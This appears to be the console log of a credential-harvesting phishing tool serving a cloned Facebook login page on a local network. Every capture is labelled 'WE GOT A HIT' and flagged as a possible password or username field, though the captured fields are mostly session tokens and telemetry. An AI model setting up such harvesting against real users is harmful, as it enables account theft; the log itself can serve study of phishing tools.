+PARAM: __rev=1009102653
+PARAM: __s=n4nnkm:xgv4z1:p5vcvm
+PARAM: __hsi=7287009357820151023
+PARAM: __dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w
+PARAM: __csr=
+PARAM: lsd=AVqehbiK38U
+PARAM: jazoest=2939
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_r=1009102653
+[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_t=1696639079
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:43:56] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+PARAM: local_storage[hb_timestamp]=13
+PARAM: local_storage[Session]=20
+PARAM: local_storage[signal_flush_timestamp]=13
+PARAM: session_storage[TabId]=6
+PARAM: session_storage[sp_pi]=216
+PARAM: logtime=1
+[91mPOSSIBLE USERNAME FIELD FOUND: __user=0
+[92m
+PARAM: __a=1
+PARAM: __req=7
+PARAM: __hs=19637.BP:DEFAULT.2.0..0.0
+PARAM: dpr=1
+PARAM: __ccg=EXCELLENT
+PARAM: __rev=1009102653
+PARAM: __s=n4nnkm:xgv4z1:p5vcvm
+PARAM: __hsi=7287009357820151023
+PARAM: __dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w
+PARAM: __csr=
+PARAM: lsd=AVqehbiK38U
+PARAM: jazoest=2939
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_r=1009102653
+[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk
+[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: __spin_t=1696639079
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:43:56] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------24213560514063408053064947974
+Content-Disposition: form-data; name="ts"
+
+1696639451778
+-----------------------------24213560514063408053064947974
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"rhnwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJmMTM2MTU0NC03MWMwLTQ3NjEtYmUyMi03MWM1ZTUwMzlhM2JcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CccEZRR3JjOXJZczNjR01IYVdjNzZKYmRERFRteWh5V1pYQVRTOEhVRFZVVTlpVFkvTStxZ2Q0V0ZkMlZoQkVaRzR3SzVGcTN1Vkc1cm9FWjdCNW9SSFh5dmZRQzVVT3ZNSUhSWXNXYzMvV3o1TXJTUEd0TE9rMUNHdkYzZE9UYjgveW5FNkdOaFdaM0dCYytQa2crRk9BPT1cIixcIgno9BQBLTF9IiwiciI6MSwiZCI6IiRefEFjWjFjRk5xNVNQLUo2eWJXQU50SGZlbTRmTFdUbGJjbnNyS3JhMkpzMVFqcVc2VC0xRkZINzJuR1FzbUtnZUlVd1JQRlBjMHlVQVdCdThycDZ1TXNGSlVuQm5ZfGZkLkFjWURGUEZoVTRPdVZxQm0wWGplQkl0TkozOGRWZmYwYktUU0xNVkljdlltUUVzWllwTm1YVXE2R1p3ZUpvcHR5VmxPS1lMNGx0bWtLcC1SSDdNdXUxSjEiLCJzIjoibjRubmttOnhndjR6MTpwNXZjdm0iLCJ0IjoxNjk2NjM5MDgwMzY1Ljl9LDE2OTY2MzkzNzYzMjAsMyw1MDBdLFsiZkUiMG9kc193ZWJfYmF0Y2hdIQUQJFwiOntcIjEzNDQJCgBmATMYLmV2ZW50LgE1UHRpbWVfc3BlbnRfYml0X2FycmF5XAU0bGpzLnVzZV9iYW56YWkubG9nX2ltbWVkaWF0ZWwBIyRbMSxudWxsXSxcASsNJxxwb3N0aW5nXwVhBFwiFSUMfSxcIgl7MGZhYnJpYy53d3cuQzP6agB2lgAUcGxhbmVzEZpAd3JpdGVfdG9fdHJhbnNwb3IunwAJxAW1GSkQcXVldWVSxAANKQxlYl90Sj8BLtgADSoRfEJTAAR9ff7WAv7WAv7WAsbWAhA5MzQyNy7WAvCfODkzODAsMCw2ODFdLFsicmVxdWlyZV9jb25kX2V4cG9zdXJlX2xvZ2dpbmciLHsiaWRlbnRpZmllciI6IkFhMXdpM0dhTzhzaWIyV1ROc3R5eVJrdWdnaVdKdHJqQ0kwaUszUnBaSklCR0FibDlKZld2QVh4czNLRUc0SmxhY2NUbFlidU1RejhWLVpQaHM0X1NDSDctbnRGNWY4In0sMWmOLDQwNjMyMiwwLDExMgGnRc8AOv6fBeafBfCBY3dwUC83dnhDdkkzanZzZ0xEVTcwQ1d4VzhQUGdWUWZIKzhFRmh6Z1ZocHlrajZRUmM3Yit1SXIvUGtIR25Da0lmYWJGdFlRUGh5dk44Snd2d2h4RHBTUk81dUgxMmRITDlHZ0J5L0ZVQjAyMzNuVWdEdUFNOFFqUldlRkRCZW53Pf6fBf6fBf6fBfqfBRQxMTAzNzBdyU0iBDEs/p8FqZ82WwIEXCKhyUaVBRxjcml0aWNhbJ2pic7+kgU2kgWOZwClj1YpAP6MBX6MBTYsAf6CBf6CBf6CBf6CBXqCBQgxMTU6uQIEMTGJ2wQ2NYXbCGdrMrV5DlEIAGkucQWQMTg1NzU4MSIsImhhc2giOiJBVDV5VHhHTXA2bGUwUEF0N3UwIrk2DDUwNzehNgQ1M7k1XjoHAWwa3gocc2lkX3Jhd1wOngoYbjRubmttOjIpCRLRCihzdGFydF90aW1lXA7ZCgQ5Ng4kCRw4NixcInRvcyLMCDxbLTIxMTM5NjIwNTMsMjE5YSABIBxjdW1cIjozMg0vAGkWTgsAcBKICQRcIg0WHGxlblwiOjY0DQ8Ic2VxAWv+tQf+tQf+tQfCtQcUMTU0ODE4LuwEMDUwNzcyLDAsNDE3XV0=","user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]
+-----------------------------24213560514063408053064947974--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:44:11] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=8&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+192.168.0.68 - - [06/Oct/2023 20:44:18] "GET /index.html HTTP/1.1" 200 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------2306929356426200864192487196
+Content-Disposition: form-data; name="ts"
+
+1696639459030
+-----------------------------2306929356426200864192487196
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"mw7waVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJmMTM2MTU0NC03MWMwLTQ3NjEtYmUyMi03MWM1ZTUwMzlhM2JcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CccEZRR3JjOXJZczNjR01IYVdjNzZKYmRERFRteWh5V1pYQVRTOEhVRFZVVTlpVFkvTStxZ2Q0V0ZkMlZoQkVaRzR3SzVGcTN1Vkc1cm9FWjdCNW9SSFh5dmZRQzVVT3ZNSUhSWXNXYzMvV3o1TXJTUEd0TE9rMUNHdkYzZE9UYjgveW5FNkdOaFdaM0dCYytQa2crRk9BPT1cIixcIgno9BQBLTF9IiwiciI6MSwiZCI6IiRefEFjWjFjRk5xNVNQLUo2eWJXQU50SGZlbTRmTFdUbGJjbnNyS3JhMkpzMVFqcVc2VC0xRkZINzJuR1FzbUtnZUlVd1JQRlBjMHlVQVdCdThycDZ1TXNGSlVuQm5ZfGZkLkFjWURGUEZoVTRPdVZxQm0wWGplQkl0TkozOGRWZmYwYktUU0xNVkljdlltUUVzWllwTm1YVXE2R1p3ZUpvcHR5VmxPS1lMNGx0bWtLcC1SSDdNdXUxSjEiLCJzIjoibjRubmttOnhndjR6MTpwNXZjdm0iLCJ0IjoxNjk2NjM5MDgwMzY1Ljl9LDE2OTY2MzkzNzYzMjAsNCw1MDBdLFsiZv4iAvoiAvCBY3dwUC83dnhDdkkzanZzZ0xEVTcwQ1d4VzhQUGdWUWZIKzhFRmh6Z1ZocHlrajZRUmM3Yit1SXIvUGtIR25Da0lmYWJGdFlRUGh5dk44Snd2d2h4RHBTUk81dUgxMmRITDlHZ0J5L0ZVQjAyMzNuVWdEdUFNOFFqUldlRkRCZW53Pf4iAv4iAv4iAvoiAhQxMTAzNzBdIiA0MDYzMjIsMiwyIgIwb2RzX3dlYl9iYXRjaJ1DBRAkXCI6e1wiMTM0NAkKLGZhbGNvLmV2ZW50LgE1UHRpbWVfc3BlbnRfYml0X2FycmF5XAU0bGpzLnVzZV9iYW56YWkubG9nX2ltbWVkaWF0ZWwBIyRbMSxudWxsXSxcASsNJxxwb3N0aW5nXwVhBFwiFSUMfSxcIgl7MGZhYnJpYy53d3cuQzP6agB2lgAUcGxhbmVzEZpAd3JpdGVfdG9fdHJhbnNwb3IunwAJxAW1GSkQcXVldWVSxAANKQxlYl90Sj8BLtgADSoRfEJTAAR9ff74BP74BP74BML4BBQxNTk4MTku1gIwNTU3NzEsMCw2ODFdXQ==","user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]
+-----------------------------2306929356426200864192487196--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:44:19] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=9&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------381416767139929869902584544805
+Content-Disposition: form-data; name="ts"
+
+1696639459032
+-----------------------------381416767139929869902584544805
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"gQnwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3QZVAxudWxsGRcZOxUYEGNhdXNlAT0FThR1bmxvYWQBDwU1GHNpZF9yYXcBEAUfTG40bm5rbTp4Z3Y0ejE6cDV2Y3ZtAR0ALAEFPGNsaWNrX3BvaW50X2luZm8BFAQ6ewEGEGNsYXNzAQkFRRBfOWxzYQEOAH0FNw3WFGVmX3BhZwmKFZ0NHAh1cmkBMAU+ZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sITYMLnBocAEr8NR9XCJ9IiwiciI6MSwiZCI6IiRefEFjWjFjRk5xNVNQLUo2eWJXQU50SGZlbTRmTFdUbGJjbnNyS3JhMkpzMVFqcVc2VC0xRkZINzJuR1FzbUtnZUlVd1JQRlBjMHlVQVdCdThycDZ1TXNGSlVuQm5ZfGZkLkFjWURGUEZoVTRPdVZxQm0wWGplQkl0TkozOGRWZmYwYktUU0xNVkljdlltUUVzWllwTm1YVXE2R1p3ZUpvcHR5VmxPS1lMNGx0bWtLcC1SSDdNdXUxSjEiLCJzIjoibjRGfAFYIiwidCI6MTY5NjYzOTE2MzA3OS45fSwNETQ0NTkwMzEsMCw2MjhdLC6yAl2tIGJpdF9hcnJheV2sMfcIIjpcVvMBICIsXCJzdGFydAVKAFwVgyA0NTIsXCJ0b3MJUyRcIjpbMTI3LDBdDRYcY3VtXCI6MzkNDwhpZFwBYwBwSUgBVQE7GGxlblwiOjgNJBhzZXFcIjoy/s4B/s4B/s4B/s4BPc4QNDA2XV0=","user":"0","webSessionId":"n4nnkm:xgv4z1:p5vcvm","send_method":"beacon","compression":"snappy_base64","snappy_ms":0}]
+-----------------------------381416767139929869902584544805--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:44:19] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=a&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Ap5vcvm&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------420359814240527280993651851386
+Content-Disposition: form-data; name="ts"
+
+1696639460122
+-----------------------------420359814240527280993651851386
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"nxPwn1tbInJlcXVpcmVfY29uZF9leHBvc3VyZV9sb2dnaW5nIix7ImlkZW50aWZpZXIiOiJBYTM4N3hDNmpKdWgtbFZfNC1Sc2FSbS1CYzdCWkRzWnNFR1AxeHhDREljdHQzcGE3WEFIUHp3cjk4QTFJLUdmc0I0dkRYYlFmSmRtOWNJWDQ5SVFsVm8ifSwxNjk2NjM5NDU5MTE4LDAsMTA0XSzGnwDwWDJwbzRYOUFRN1o4MGxmUGc1d3hZMmZQRjU0emxHXzcxSGlseFdOal91Tnh6c3JFT3dGa1JqUlhPeTRmajcwckVrM1o5RS1DMHJ0cVJnU3hsU3oyWHdROVk4UqMAHDhdLFsiZ2syNTlCMQGYMTA3MzUwMCIsImhhc2giOiJBVDdhSm1mbnFXeWlveE9PazJZIn0sPv4ABDUzAVq+nAHwWjF2UkRSV2Zab0UyN1dER2QyeG5uREptYWc5b0I3Z1Y5RFdQdG9COExlRlc3ZkhCcXppVHdvdzk2Y3dTSHkxeGxNNE9FaWRybHkxY2VhOUVhd3dhWncifSwxNjlOnAFy+QAUNzA4MjUzLvgAQDVuNGhCTDNZVE1uUVd0QWNRSloABDUyAfhyWQAUNjc2ODM3LlkAQDROOHdCWkE4Y3RDZEh3OV9VYlkAwlEB8FpYVGNwUEJyU19qQXpMekVLWkI3SUpmOUVpQVdOTWs0VEU5UHV0SVdIa2dPM25pWTFaQU1SaHMzQVFwTFFlZlFJcXh1OVYxMEkzeFJBdzZieE14dk85eVpZNE53SqUACDExMYL/ABQxMDk5ODk2WQE8a2x5MkxTWlZfREtHUm56a0pbANZRAvBYM0Q0U3Y2RU1DekZnUnFfQXdNS2phUlpLUXY3bnpRM3hJV1lfQXNCQUJZTDdhdzd6dkd3Mk1BME56LTdkejNqOEV4LU1GSFFJMVVYUEtFdHBlNkh5OWRpdUVKogAAMWlO8HJmYWxjbzp3ZWJfYmx1ZV90aW1lX3NwZW50X25hdmlnYXRpb24iLHsiZSI6IntcImpzb25fZGF0YVwiOlwie1xcXCJzb3VyY2VfcGF0aFxcXCI6XFxcIlhXZWJMb2dpbkNvbnRyb2xsZXJcXFwiLFxcXCJzCTAQdG9rZW4VMRw5NmU4OGFmMwERBSYQZGVzdF+iVAAFLnpSADBpbXByZXNzaW9uX2lkAWgFqkAxZUxwYmxYVDVyUXloSGhtRwEaBYIQY2F1c2UBDgUoCGxvYQU1BRsYc2lkX3JhdxUdTG40bm5rbTp4Z3Y0ejE6cGxsOGR6AR0JLQnwFGVmX3BhZwlRDG51bGwuHAAIdXJpAS8FaWRodHRwczovL3d3dy5mYWNlYm9vay5jb20vbCFQDC5waHABKwU+BfZSWAAFGtpWAA2wGHJlc3RvcmUF9fDYOnRydWV9XCJ9IiwiciI6MSwiZCI6IiRefEFjWjFjRk5xNVNQLUo2eWJXQU50SGZlbTRmTFdUbGJjbnNyS3JhMkpzMVFqcVc2VC0xRkZINzJuR1FzbUtnZUlVd1JQRlBjMHlVQVdCdThycDZ1TXNGSlVuQm5ZfGZkLkFjWURGUEZoVTRPdVZxQm0wWGplQkl0TkozOGRWZmYwYktUU0xNVkljdlltUUVzWllwTm1YVXE2R1p3ZUpvcHR5VmxPS1lMNGx0bWtLcC1SSDdNdXUxSjEiLCJzIjoibkq4ARgiLCJ0IjoxqYMcMDc5ODE0LjlGMgYYNzY5XSxbInk/PHBlcmZfZGV2aWNlX2luZm/h1BAiLHsiZWk5JGNwdV9jb3Jlc1wBXRwsXCJyYW1cIk0KMCJncHVfcmVuZGVyZXJhQzgiQU5HTEUgKEludGVsLCAFB4goUikgSEQgR3JhcGhpY3MgRGlyZWN0M0QxMSB2c181XzAgcAUHEClcIixcBVIQdmVuZG8JUChHb29nbGUgSW5jLg1WACn+zwH+zwH+zwHazwEEMjY6zwEkMzAsMCw0MDddXQ==","user":"0","webSessionId":"n4nnkm:xgv4z1:pll8dz","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]
+-----------------------------420359814240527280993651851386--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+192.168.0.68 - - [06/Oct/2023 20:44:20] "POST /ajax/bz?__a=1&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG78b87C0yE7i0n24o5-0me2218w5uw5Uwdq0Ho2ewnE3fw5rwSyE1582ZwrU19E36w&__hs=19637.BP%3ADEFAULT.2.0..0.0&__hsi=7287009357820151023&__req=1&__rev=1009102653&__s=n4nnkm%3Axgv4z1%3Apll8dz&__spin_b=trunk&__spin_r=1009102653&__spin_t=1696639079&__user=0&dpr=1&jazoest=2939&lsd=AVqehbiK38U HTTP/1.1" 302 -
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: -----------------------------245459705111303035392637579936
+Content-Disposition: form-data; name="ts"
+
+1696639461105
+-----------------------------245459705111303035392637579936
+Content-Disposition: form-data; name="q"
+
+[{"app_id":"256281040558","posts":"/RCAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMTM0NAkKBTMYLmV2ZW50LgU1ZGx1ZV90aW1lX3NwZW50X25hdmlnYXRpb25cBTq4anMudXNlX2JhbnphaS5sb2dfaW1tZWRpYXRlbHlcIjpbMSxudWxsXSxcImpzLmIJJxxwb3N0aW5nXwVnHSUMfSxcIgmBMGZhYnJpYy53d3cuQzP6agB2lgAUcGxhbmVzEZpAd3JpdGVfdG9fdHJhbnNwb3IFnwQyLB3EBbUZKRBxdWV1ZQHEMiUANhQBAR9eCAEBnh0gOQMNaAhlYl9mhAEuHQENMBHBFZgNeU5ZAEhwZXJmX2RldmljZV9pbmZvX2xvAYwAeyWspsMAdssBDZgEZWJSbwCuwgABwwwyOTY2SRAMbXMudFWYCC5xYUEtCRodF0xiaXRzLmpzX2luaXRpYWxpemVkXFmV9BwBfX19fSIsInIiOjEsImQiOiIkXnxBY1oxY0ZOcTVTUC1KNnliV0FOdEhmZW00ZkxXVGxiY25zcktyYTJKczFRanFXNlQtMUZGSDcybkdRc21LZ2VJVXdSUEZQYzB5VUFXQnU4cnA2dU1zRkpVbkJuWXxmZC5BY1lERlBGaFU0T3VWcUJtMFhqZUJJdE5KMzhkVmZmMGJLVFNMTVZJY3ZZbVFFc1pZcE5tWFVxNkdad2VKb3B0eVZsT0tZTDRsdG1rS3AtUkg3TXV1MUoxIiwicyI6Im40bm5rbTp4Z3Y0ejE6cGxsOGR6IiwidCI6MTY5NjYzOTA4MTc5OC45fSwxNjk2NjM5NDYxMTA0LDEsMTAzMl0sWyJmYWxjbzp3cnkCnUd0anNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoAQ8AOgEFSFhXZWJMb2dpbkNvbnRyb2xsZXIBFwAsAQUNMBB0b2tlbgEQBTEcOTZlODhhZjMBEQUmDGRlc3QZVGGSGRcZOxUYEGNhdXNlAT0FThR1bmxvYWQBDwU1GHNpZF9yYXcBEAUfBG40RjcBAR0JLQnPFGVmX3BhZwlTFWYNHAh1cmkBLwVMHGh0dHBzOi8vgb00ZmFjZWJvb2suY29tL2wB/wwucGhwASsIfVwi/nwC/nwC/nwCznwCFDgwMC45fTJ8AiA1LDAsNTczXSzRsYEsAHR12yRfYml0X2FycmF5XXUxwEFzUrwBICIsXCJzdGFydAVKFFwiOjE2OUXuHDU5LFwidG9zCVMcXCI6WzMsMF0NFBhjdW1cIjoyDQ4IaWRcAWBpRQBcAVIodG9zX2xlblwiOjMNJBhzZXFcIjow/ssB/ssB/ssB1ssBADFOywEQNDAzXV0=","user":"0","webSessionId":"n4nnkm:xgv4z1:pll8dz","send_method":"beacon","compression":"snappy_base64","snappy_ms":0}]
+-----------------------------245459705111303035392637579936--
+[92m
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
